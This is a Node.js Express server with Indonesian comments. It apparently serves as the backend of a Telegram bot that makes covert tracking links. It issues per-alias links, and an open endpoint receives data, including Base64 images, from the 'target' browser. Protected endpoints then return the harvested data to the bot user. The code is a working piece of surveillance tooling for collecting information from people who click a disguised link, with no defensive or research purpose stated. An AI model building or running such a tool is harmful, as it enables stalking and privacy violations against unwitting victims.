const express = require('express');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' })); // Limit besar untuk gambar Base64
app.use(express.static(path.join(__dirname, 'public')));

// Menggunakan Environment Variable untuk API Key (Sangat Direkomendasikan)
const API_KEY = process.env.API_KEY;
if (!API_KEY) {
    console.error("FATAL ERROR: API_KEY tidak diatur di environment variables!");
    process.exit(1); // Keluar jika API Key tidak ada
}

// Database di memori, akan hilang jika server restart.
const tracking_data = {};

// Middleware untuk proteksi API
const apiKeyAuth = (req, res, next) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey && apiKey === API_KEY) {
        next();
    } else {
        res.status(403).json({ status: "error", message: "Unauthorized: Invalid API Key" });
    }
};

// --- Routes & Endpoints ---

// Endpoint untuk konfirmasi server online
app.get('/ping', (req, res) => {
    res.send('Server is alive!');
});

// Endpoint untuk menerima data dari browser target
app.post('/api/data', (req, res) => {
    const { link_id, data } = req.body;
    if (!link_id || !data) {
        return res.status(400).json({ status: "error", message: "Data tidak lengkap" });
    }
    
    console.log(`[INFO] Menerima data untuk link ID: ${link_id}`);
    
    let found = false;
    for (const userId in tracking_data) {
        for (const alias in tracking_data[userId]) {
            if (tracking_data[userId][alias].link_id === link_id) {
                tracking_data[userId][alias].last_data = {
                    ...data,
                    timestamp: new Date().toISOString()
                };
                found = true;
                console.log(`[SUCCESS] Data untuk alias '${alias}' berhasil disimpan.`);
                break;
            }
        }
        if (found) break;
    }

    if (found) {
        res.json({ status: "sukses" });
    } else {
        console.warn(`[WARN] Link ID ${link_id} tidak ditemukan saat menerima data.`);
        res.status(404).json({ status: "error", message: "Link ID tidak ditemukan" });
    }
});

// --- API Endpoints untuk Bot Telegram (Diproteksi) ---

app.post('/api/create_link', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.body;
    if (!user_id || !alias) {
        return res.status(400).json({ status: "error", message: "user_id dan alias diperlukan" });
    }

    const link_id = uuidv4();
    const link_url = `${req.protocol}://${req.get('host')}/?id=${link_id}`;

    if (!tracking_data[user_id]) {
        tracking_data[user_id] = {};
    }
    
    tracking_data[user_id][alias] = {
        link_id: link_id,
        last_data: null,
        link: link_url,
        created_at: new Date().toISOString()
    };
    
    console.log(`[INFO] Link dibuat untuk user ${user_id} dengan alias ${alias}`);
    res.json({ status: "sukses", link: link_url });
});

app.get('/api/list_links/:user_id', apiKeyAuth, (req, res) => {
    const { user_id } = req.params;
    const userLinks = tracking_data[user_id];
    if (!userLinks) {
        return res.json({ status: "sukses", links: {} });
    }
    const linksToReturn = Object.keys(userLinks).map(alias => ({
        alias: alias,
        link: userLinks[alias].link,
        has_data: !!userLinks[alias].last_data
    }));
    res.json({ status: "sukses", links: linksToReturn });
});

app.get('/api/get_data/:user_id/:alias', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.params;
    const trackingInfo = tracking_data[user_id]?.[alias];

    if (trackingInfo && trackingInfo.last_data) {
        res.json({ status: "sukses", data: trackingInfo.last_data });
    } else {
        res.status(404).json({ status: "error", message: "Data belum tersedia atau alias tidak ditemukan." });
    }
});

app.post('/api/delete_link', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.body;
    if (tracking_data[user_id]?.[alias]) {
        delete tracking_data[user_id][alias];
        console.log(`[INFO] Link untuk alias ${alias} dari user ${user_id} telah dihapus.`);
        res.json({ status: "sukses", message: `Link untuk ${alias} berhasil dihapus.` });
    } else {
        res.status(404).json({ status: "error", message: "Alias tidak ditemukan" });
    }
});

app.listen(PORT, () => {
    console.log(`Server pelacakan berjalan di port ${PORT}`);
});
